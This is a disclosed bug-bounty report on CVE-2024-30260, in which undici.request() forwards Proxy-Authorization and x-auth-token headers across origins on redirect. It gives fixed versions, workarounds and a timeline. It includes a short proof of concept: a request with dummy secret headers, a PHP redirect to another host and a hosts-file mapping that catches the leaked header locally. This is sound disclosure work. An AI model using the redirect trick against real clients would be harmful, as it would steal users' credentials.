Skip to main content Â >
Hacktivity Opportunities Directory Leaderboard
Learn more about HackerOne
Log in
52 #2451113 Copy report id Copy report id Proxy-Authorization header not cleared on cross-origin redirect in undici.request Share: Summary by Internet Bug Bounty Menu Menu Proxy-Authorization header not cleared on cross-origin redirect for dispatch, request, stream, pipeline Impact
Undici cleared Authorization and Proxy-Authorization headers for fetch(), but did not clear them for undici.request(). Patches
This has been patched in 6805746.
Fixes has been released in v5.28.4 and v6.11.1. Workarounds
use fetch() or disable maxRedirections. References
Linzi Shang reported this. GHSA: https://github.com/nodejs/undici/security/advisories/GHSA-m4v8-wqvr-p9f7 Timeline iylz submitted a report to Internet Bug Bounty . April 7, 2024, 2:32pm UTC Menu Menu Summary:: Undici already cleared Authorization and Cookie headers on cross-origin redirects, but did not clear Proxy-Authorization and x-auth-token headers. Description:
Like https://github.com/nodejs/undici/security/advisories/GHSA-3787-6prv-h9w3 , this is a fixed security issue in v5.28.3, v6.6.1, but I have tested the new version(v6.7.0) and it has not been fixed yet. Steps To Reproduce:
POC: Code 494 Bytes Unwrap lines Copy Download 1 var undici = require('undici'); 2 3 const { 4 statusCode, 5 headers, 6 trailers, 7 body 8 } = undici.request({ 9 method: 'GET', 10 maxRedirections: 1, 11 origin: "http://127.0.0.1/", 12 pathname: "", 13 headers: { 14 'content-type': 'application/json', 15 'Cookie': 'secret Cookie', 16 'Authorization': 'secret Authorization', 17 'Proxy-Authorization': 'secret Proxy-Authorization', 18 'x-auth-token': 'secret x-auth-token', 19 'Host': 'test.cn' 20 } 21 }) The http://127.0.0.1/ is a redirect server. Sourcecode: Code 47 Bytes Unwrap lines Copy Download 1 <?php 2 header("Location: http://a.com:2333"); 3 ?> Add the 1 record in the /etc/hosts file: Code 17 Bytes Unwrap lines Copy Download 1 127.0.0.1   a.com Listening on port 2333 and discovering that Proxy-Authorization headers has been passed. Impact: <=undici@6.7.0 Supporting Material/References: https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Proxy-Authorization Impact Undici already cleared Authorization and Cookie headers on cross-origin redirects, but did not clear Proxy-Authorization headers. iylz posted a comment . April 7, 2024, 2:32pm UTC Menu Menu https://github.com/nodejs/undici/security/advisories/GHSA-m4v8-wqvr-p9f7 iylz posted a comment . April 7, 2024, 2:57pm UTC Menu Menu I provided for the patch in https://github.com/nodejs/undici/commit/6805746680d27a5369d7fb67bc05f95a28247d75#diff-ea7696549c3a0b60a4a7e07cc79b6d4e950c7cb1068d47e368a510967d77e7e5 . kunderkoffler changed the status to Triaged . April 9, 2024, 8:17pm UTC Menu Menu Starting the check process. kunderkoffler updated the severity to low . April 29, 2024, 2:38pm UTC Menu Menu IBB policy is to prioritize the severity assigned by the project. In this case, that is a Low: https://github.com/nodejs/undici/security/advisories/GHSA-m4v8-wqvr-p9f7 kunderkoffler updated CVE reference to CVE-2024-30260 . April 29, 2024, 2:38pm UTC Menu Menu Internet Bug Bounty rewarded iylz with a $420 bounty . April 29, 2024, 2:41pm UTC Menu Menu Thank you for your contribution to making the Internet safer! Node.js does have modifiers in place on their IBB submissions, so in this case this submission was awarded at 75% of the standard reward amount. This bounty was awarded with a 80/20% split. An additional $105 will be paid to the project. kunderkoffler closed the report and changed the status to Resolved . April 29, 2024, 2:43pm UTC Menu Menu Thank you for your submission, @iylz ! kunderkoffler requested to disclose this report . April 29, 2024, 2:43pm UTC Menu Menu This report has been disclosed . May 29, 2024, 2:43pm UTC Menu Menu
It looks like your JavaScript is disabled. To use HackerOne, enable JavaScript in your browser and refresh this page.